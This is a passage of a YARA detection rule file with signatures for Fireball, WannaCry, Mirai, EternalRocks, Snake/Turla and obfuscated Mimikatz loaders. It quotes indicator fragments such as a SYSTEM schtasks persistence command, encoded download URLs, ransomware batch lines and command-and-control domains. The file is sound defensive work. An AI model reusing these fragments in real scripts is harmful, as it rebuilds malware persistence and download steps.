\"C:\\\\v3\\\\exe\\\\de_svr_inst.pdb\" fullword ascii\n      $s5 = \"Internet Connect Failed!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 4 of them )\n}\n\nrule Fireball_lancer_RID2D06 : APT DEMO EXE FILE T1218_011 {\n   meta:\n      description = \"Detects Fireball malware - file lancer.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.checkpoint.com/research/fireball-chinese-malware-250-million-infection/\"\n      date = \"2017-06-02 10:14:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"7d68386554e514f38f98f24e8056c11c0a227602ed179d54ed08f2251dc9ea93\"\n      tags = \"APT, DEMO, EXE, FILE, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\instlsp\\\\Release\\\\Lancer.pdb\" ascii\n      $x2 = \"lanceruse.dat\" fullword wide\n      $s1 = \"Lancer.dll\" fullword ascii\n      $s2 = \"RunDll32.exe \\\"\" fullword wide\n      $s3 = \"Micr.dll\" fullword wide\n      $s4 = \"AG64.dll\" fullword wide\n      $s5 = \"\\\",Start\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or ( 6 of them )\n}\n\nrule QQBrowser_RID2A97 : APT DEMO EXE FILE {\n   meta:\n      description = \"Not malware but suspicious browser - file QQBrowser_RID2A97.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.checkpoint.com/research/fireball-chinese-malware-250-million-infection/\"\n      date = \"2017-06-02 07:03:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"adcf6b8aa633286cd3a2ce7c79befab207802dec0e705ed3c74c043dabfc604c\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"TerminateProcessWithoutDump\" fullword ascii\n      $s2 = \".Downloader.dll\" fullword wide\n      $s3 = \"Software\\\\Chromium\\\\BrowserCrashDumpAttempts\" fullword wide\n      $s4 = \"QQBrowser_RID2A97_Broker.exe\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule chrome_elf_RID2B25 : APT DEMO EXE FILE LINUX T1053_005 T1218_011 {\n   meta:\n      description = \"Detects Fireball malware - file chrome_elf_RID2B25.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.checkpoint.com/research/fireball-chinese-malware-250-million-infection/\"\n      date = \"2017-06-02 08:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"e4d4f6fbfbbbf3904ca45d296dc565138a17484c54aebbb00ba9d57f80dfe7e5\"\n      tags = \"APT, DEMO, EXE, FILE, LINUX, T1053_005, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"schtasks /Create /SC HOURLY /MO %d /ST 00:%02d:00 /TN \\\"%s\\\" /TR \\\"%s\\\" /RU \\\"SYSTEM\\\"\" fullword wide\n      $s6 = \"aHR0cDovL2R2Mm0xdXVtbnNndHUuY2xvdWRmcm9udC5uZXQvdjQvZ3RnLyVzP2FjdGlvbj12aXNpdC5jaGVsZi5pbnN0YWxs\" fullword ascii\n      $s7 = \"QueryInterface call failed for IExecAction: %x\" fullword ascii\n      $s10 = \"%s %s,Rundll32_Do %s\" fullword wide\n      $s13 = \"Failed to create an instance of ITaskService: %x\" fullword ascii\n      $s16 = \"Rundll32_Do\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 4 of them )\n}\n\nrule Fireball_regkey_RID2D18 : APT DEMO EXE FILE T1113 {\n   meta:\n      description = \"Detects Fireball malware - file regkey.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.checkpoint.com/research/fireball-chinese-malware-250-million-infection/\"\n      date = \"2017-06-02 10:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"fff2818caa9040486a634896f329b8aebaec9121bdf9982841f0646763a1686b\"\n      tags = \"APT, DEMO, EXE, FILE, T1113\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\WinMain\\\\Release\\\\WinMain.pdb\" ascii\n      $s2 = \"ScreenShot\" fullword wide\n      $s3 = \"WINMAIN\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule Fireball_winsap_RID2D23 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Fireball malware - file winsap.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.checkpoint.com/research/fireball-chinese-malware-250-million-infection/\"\n      date = \"2017-06-02 10:19:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"c7244d139ef9ea431a5b9cc6a2176a6a9908710892c74e215431b99cd5228359\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"aHR0cDovL2\" ascii\n      $s2 = \"%s\\\\svchost.exe -k %s\" fullword wide\n      $s3 = \"\\\\SETUP.dll\" wide\n      $s4 = \"WinSAP.dll\" fullword ascii\n      $s5 = \"Error %u in WinHttpQueryDataAvailable.\" fullword ascii\n      $s6 = \"UPDATE OVERWRITE\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 4 of them )\n}\n\nrule Fireball_archer_RID2D06 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Fireball malware - file archer.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.checkpoint.com/research/fireball-chinese-malware-250-million-infection/\"\n      date = \"2017-06-02 10:14:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\archer_lyl\\\\Release\\\\Archer_Input.pdb\" ascii\n      $s1 = \"Archer_Input.dll\" fullword ascii\n      $s2 = \"InstallArcherSvc\" fullword ascii\n      $s3 = \"%s_%08X\" fullword wide\n      $s4 = \"d\\\\\\\\.\\\\PhysicalDrive%d\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( $x1 or 3 of them )\n}\n\nrule clearlog_RID2A5A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Fireball malware - file clearlog_RID2A5A.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.checkpoint.com/research/fireball-chinese-malware-250-million-infection/\"\n      date = \"2017-06-02 05:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"14093ce6d0fe8ab60963771f48937c669103842a0400b8d97f829b33c420f7e3\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\ClearLog\\\\Release\\\\logC.pdb\" ascii\n      $s1 = \"C:\\\\Windows\\\\System32\\\\cmd.exe /c \\\"\\\"\" fullword wide\n      $s2 = \"logC.dll\" fullword ascii\n      $s3 = \"hhhhh.exe\" fullword wide\n      $s4 = \"ttttt.exe\" fullword wide\n      $s5 = \"Logger Name:\" fullword ascii\n      $s6 = \"cle.log.1\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and $x1 or 2 of them )\n}\n\nrule Fireball_gubed_RID2C98 : APT DEMO EXE FILE T1546_012 {\n   meta:\n      description = \"Detects Fireball malware - file gubed.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.checkpoint.com/research/fireball-chinese-malware-250-million-infection/\"\n      date = \"2017-06-02 09:55:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"e3f69a1fb6fcaf9fd93386b6ba1d86731cd9e5648f7cff5242763188129cd158\"\n      tags = \"APT, DEMO, EXE, FILE, T1546_012\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\MRT.exe\" fullword wide\n      $x2 = \"tIphlpapi.dll\" fullword wide\n      $x3 = \"http://%s/provide?clients=%s&reqs=visit.startload\" fullword wide\n      $x4 = \"\\\\Gubed\\\\Release\\\\Gubed.pdb\" ascii\n      $x5 = \"d2hrpnfyb3wv3k.cloudfront.net\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}\n\nrule TA459_Malware_May17_1_RID2DEE : DEMO FILE G0062 MAL {\n   meta:\n      description = \"Detects TA459 related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/apt-targets-financial-analysts#.WS3IBVFV4no.twitter\"\n      date = \"2017-05-31 10:52:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"5fd61793d498a395861fa263e4438183a3c4e6f1e4f098ac6e97c9d0911327bf\"\n      tags = \"DEMO, FILE, G0062, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"xtsewy\" fullword ascii\n      $s6 = \"CW&mhAklnfVULL\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6152 and filesize < 800KB and all of them )\n}\n\nrule TA459_Malware_May17_2_RID2DEF : DEMO EXE FILE G0062 MAL {\n   meta:\n      description = \"Detects TA459 related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/apt-targets-financial-analysts#.WS3IBVFV4no.twitter\"\n      date = \"2017-05-31 10:53:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"4601133e94c4bc74916a9d96a5bc27cc3125cdc0be7225b2c7d4047f8506b3aa\"\n      tags = \"DEMO, EXE, FILE, G0062, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"Mcutil.dll\" fullword ascii\n      $a2 = \"mcut.exe\" fullword ascii\n      $s1 = \"Software\\\\WinRAR SFX\" fullword ascii\n      $s2 = \"AYou may need to run this self-extracting archive as administrator\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of ( $a* ) and 1 of ( $s* ) )\n}\n\nrule EternalRocks_taskhost_FR_RID30A5 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects EternalRocks Malware - file taskhost.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/stamparm/status/864865144748298242\"\n      date = \"2017-05-18 12:48:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cf8533849ee5e82023ad7adbdbd6543cb6db596c53048b1a0c00b3643a72db30\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"EternalRocks.exe\" fullword wide\n      $s1 = \"sTargetIP\" fullword ascii\n      $s2 = \"SERVER_2008R2_SP0\" fullword ascii\n      $s3 = \"20D5CCEE9C91A1E61F72F46FA117B93FB006DB51\" fullword ascii\n      $s4 = \"9EBF75119B8FC7733F77B06378F9E735D34664F6\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 1 of ( $x* ) or 3 of them )\n}\n\nrule EternalRocks_svchost_FR_RID303E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects EternalRocks Malware - file taskhost.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/stamparm/status/864865144748298242\"\n      date = \"2017-05-18 12:31:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"589af04a85dc66ec6b94123142a17cf194decd61f5d79e76183db026010e0d31\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WczTkaJphruMyBOQmGuNRtSNTLEs\" fullword ascii\n      $s2 = \"svchost.taskhost.exe\" fullword ascii\n      $s3 = \"ConfuserEx v\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 2 of them )\n}\n\nrule Docm_in_PDF_RID2B03 : DEMO FILE SUSP {\n   meta:\n      description = \"Detects an embedded DOCM in PDF combined with OpenAction\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-05-15 08:48:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $a1 = /<<\\/Names\\[\\([\\w]{1,12}.docm\\)/ ascii\n      $a2 = \"OpenAction\" ascii fullword\n      $a3 = \"JavaScript\" ascii fullword\n   condition: \n      uint32 ( 0 ) == 0x46445025 and all of them\n}\n\nrule WannaCry_Ransomware_Gen_RID302B : CRIME DEMO EXE FILE GEN MAL RANSOM {\n   meta:\n      description = \"Detects WannaCry Ransomware\"\n      author = \"Florian Roth (based on rule by US CERT)\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-132A\"\n      date = \"2017-05-12 12:28:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9fe91d542952e145f2244572f314632d93eb1e8657621087b2ca7f7df2b0cb05\"\n      hash2 = \"8e5b5841a3fe81cade259ce2a678ccb4451725bba71f6662d0cc1f08148da8df\"\n      hash3 = \"4384bf4530fb2e35449a8e01c7e0ad94e3a25811ba94f7847c1e6612bbb45359\"\n      tags = \"CRIME, DEMO, EXE, FILE, GEN, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"__TREEID__PLACEHOLDER__\" ascii\n      $s2 = \"__USERID__PLACEHOLDER__\" ascii\n      $s3 = \"Windows for Workgroups 3.1a\" fullword ascii\n      $s4 = \"PC NETWORK PROGRAM 1.0\" fullword ascii\n      $s5 = \"LANMAN1.0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them\n}\n\nrule WannCry_m_vbs_RID2C49 : CRIME DEMO FILE MAL RANSOM SCRIPT {\n   meta:\n      description = \"Detects WannaCry Ransomware VBS\"\n      author = \"Florian Roth\"\n      reference = \"https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100\"\n      date = \"2017-05-12 09:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"51432d3196d9b78bdc9867a77d601caffd4adaa66dcac944a5ba0b3112bbea3b\"\n      tags = \"CRIME, DEMO, FILE, MAL, RANSOM, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".TargetPath = \\\"C:\\\\@\" ascii\n      $x2 = \".CreateShortcut(\\\"C:\\\\@\" ascii\n      $s3 = \" = WScript.CreateObject(\\\"WScript.Shell\\\")\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x4553 and filesize < 1KB and all of them )\n}\n\nrule WannCry_BAT_RID2B09 : CRIME DEMO FILE MAL RANSOM SCRIPT {\n   meta:\n      description = \"Detects WannaCry Ransomware BATCH File\"\n      author = \"Florian Roth\"\n      reference = \"https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100\"\n      date = \"2017-05-12 08:49:21\"\n      score = 100\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"f01b7f52e3cb64f01ddc248eb6ae871775ef7cb4297eba5d230d0345af9a5077\"\n      tags = \"CRIME, DEMO, FILE, MAL, RANSOM, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"@.exe\\\">> m.vbs\" ascii\n      $s2 = \"cscript.exe //nologo m.vbs\" fullword ascii\n      $s3 = \"echo SET ow = WScript.CreateObject(\\\"WScript.Shell\\\")> \" ascii\n      $s4 = \"echo om.Save>> m.vbs\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6540 and filesize < 1KB and 1 of them )\n}\n\nrule WannaCry_RansomNote_RID2E99 : CRIME DEMO FILE MAL RANSOM {\n   meta:\n      description = \"Detects WannaCry Ransomware Note\"\n      author = \"Florian Roth\"\n      reference = \"https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100\"\n      date = \"2017-05-12 11:21:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"4a25d98c121bb3bd5b54e0b6a5348f7b09966bffeec30776e5a731813f05d49e\"\n      tags = \"CRIME, DEMO, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"A:  Don't worry about decryption.\" fullword ascii\n      $s2 = \"Q:  What's wrong with my files?\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3a51 and filesize < 2KB and all of them )\n}\n\nrule Mirai_1_May17_RID2B81 : DEMO FILE MAL {\n   meta:\n      description = \"Detects Mirai Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-05-12 09:09:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"172d050cf0d4e4f5407469998857b51261c80209d9fa5a2f5f037f8ca14e85d2\"\n      hash2 = \"9ba8def84a0bf14f682b3751b8f7a453da2cea47099734a72859028155b2d39c\"\n      hash3 = \"a393449a5f19109160384b13d60bb40601af2ef5f08839b5223f020f1f83e990\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GET /bins/mirai.x86 HTTP/1.0\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 5000KB and all of them )\n}\n\nrule Miari_2_May17_RID2B82 : DEMO FILE MAL {\n   meta:\n      description = \"Detects Mirai Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-05-12 09:09:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9ba8def84a0bf14f682b3751b8f7a453da2cea47099734a72859028155b2d39c\"\n      hash2 = \"a393449a5f19109160384b13d60bb40601af2ef5f08839b5223f020f1f83e990\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36\" fullword ascii\n      $s2 = \"GET /g.php HTTP/1.1\" fullword ascii\n      $s3 = \"https://%[^/]/%s\" fullword ascii\n      $s4 = \"pass\\\" value=\\\"[^\\\"]*\\\"\" fullword ascii\n      $s5 = \"jbeupq84v7.2y.net\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 5000KB and 2 of them )\n}\n\nrule SnakeTurla_Malware_May17_1_RID30B1 : DEMO FILE G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects Snake / Turla Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.fox-it.com/2017/05/03/snake-coming-soon-in-mac-os-x-flavour/\"\n      date = \"2017-05-04 12:50:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"5b7792a16c6b7978fca389882c6aeeb2c792352076bf6a064e7b8b90eace8060\"\n      tags = \"DEMO, FILE, G0010, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/Users/vlad/Desktop/install/install/\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xfacf and filesize < 200KB and all of them )\n}\n\nrule SnakeTurla_Malware_May17_2_RID30B2 : DEMO FILE G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects Snake / Turla Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.fox-it.com/2017/05/03/snake-coming-soon-in-mac-os-x-flavour/\"\n      date = \"2017-05-04 12:50:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"b8ee4556dc09b28826359b98343a4e00680971a6f8c6602747bd5d723d26eaea\"\n      tags = \"DEMO, FILE, G0010, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"b_openssl: oops - number of mutexes is 0\" fullword ascii\n      $s2 = \"networksetup -get%sproxy Ethernet\" fullword ascii\n      $s3 = \"012A04DECBC441e49C527B2798F54CA7LOG_NAMED_PIPE_NAME\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xfacf and filesize < 6000KB and all of them )\n}\n\nrule SnakeTurla_Malware_May17_4_RID30B4 : DEMO FILE G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects Snake / Turla Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.fox-it.com/2017/05/03/snake-coming-soon-in-mac-os-x-flavour/\"\n      date = \"2017-05-04 12:51:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"d5ea79632a1a67abbf9fb1c2813b899c90a5fb9442966ed4f530e92715087ee2\"\n      tags = \"DEMO, FILE, G0010, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Install Adobe Flash Player.app/com.adobe.updatePK\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x4b50 and filesize < 5000KB and all of them )\n}\n\nrule SnakeTurla_Installd_SH_RID2F9F : DEMO FILE G0010 MAL RUSSIA SCRIPT {\n   meta:\n      description = \"Detects Snake / Turla Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.fox-it.com/2017/05/03/snake-coming-soon-in-mac-os-x-flavour/\"\n      date = \"2017-05-04 12:05:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"DEMO, FILE, G0010, MAL, RUSSIA, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"PIDS=`ps cax | grep installdp\" ascii\n      $s2 = \"${SCRIPT_DIR}/installdp ${FILE}\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and all of them )\n}\n\nrule SnakeTurla_Install_SH_RID2F3B : DEMO FILE G0010 MAL RUSSIA SCRIPT {\n   meta:\n      description = \"Detects Snake / Turla Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.fox-it.com/2017/05/03/snake-coming-soon-in-mac-os-x-flavour/\"\n      date = \"2017-05-04 11:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"DEMO, FILE, G0010, MAL, RUSSIA, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"${TARGET_PATH}/installd.sh\" ascii\n      $s2 = \"$TARGET_PATH2/com.adobe.update.plist\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and all of them )\n}\n\nrule Enigma_Protected_Malware_May17_RhxFiles_RID3605 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Enigma protected malware samples\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-05-02 16:38:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2187d6bd1794bf7b6199962d8a8677f19e4382a124c30933d01aba93cc1f0f15\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { bd 9c 74 f6 7a 3a f7 94 c5 7d 7c 7c 7c 7e ae 73 } \n      $op2 = { 82 62 6b 6b 6b 68 a5 ea aa 69 6b 6b 6b 3a 3b 94 } \n      $op3 = { 7c 7c c5 7d 7c 7c 7c 7e ae 73 f9 79 7c 7c 7c f6 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them )\n}\n\nrule EnigmaPacker_Rare_RID2DA1 : DEMO EXE FILE MAL T1027_002 {\n   meta:\n      description = \"Detects an ENIGMA packed executable\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-04-27 10:40:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"77be6e80a4cfecaf50d94ee35ddc786ba1374f9fe50546f1a3382883cb14cec9\"\n      tags = \"DEMO, EXE, FILE, MAL, T1027_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"P.rel$oc$\" fullword ascii\n      $s2 = \"ENIGMA\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them )\n}\n\nrule Obfuscated_VBS_April17_RID2F1A : ANOMALY DEMO HKTL OBFUS S0002 SCRIPT T1003 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Detects cloaked Mimikatz in VBS obfuscation\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-04-21 11:42:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"ANOMALY, DEMO, HKTL, OBFUS, S0002, SCRIPT, T1003, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"::::::ExecuteGlobal unescape(unescape(\" ascii\n   condition: \n      filesize < 500KB and all of them\n}\n\nrule Obfuscated_JS_April17_RID2ECC : ANOMALY DEMO HKTL OBFUS S0002 T1003 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Detects cloaked Mimikatz in JS obfuscation\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-04-21 11:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"ANOMALY, DEMO, HKTL, OBFUS, S0002, T1003, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\";function Main(){for(var \" ascii\n      $s2 = \"=String.fromCharCode(parseInt(\" ascii\n      $s3 = \"));(new Function(\" ascii\n   condition: \n      filesize < 500KB and all of them\n}\n\nrule EquationGroup_scanner_output_RID32BD : APT DEMO {\n   meta:\n      description = \"Detects output generated by EQGRP scanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-04-17 14:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"# scanning ip  \" ascii\n      $s1 = \"# Scan for windows boxes\" ascii fullword\n      $s2 = \"Going into send\" ascii fullword\n      $s3 = \"# Does not work\" ascii fullword\n      $s4 = \"You are the weakest link, goodbye\" ascii fullword\n      $s5 = \"rpc   Scan for RPC  folks\" ascii fullword\n   condition: \n      filesize < 1000KB and 2 of them\n}\n\nrule EquationGroup_Toolset_Apr17_Eclipsedwing_Rpcproxy_Pcdlllauncher_RID403A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 23:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = 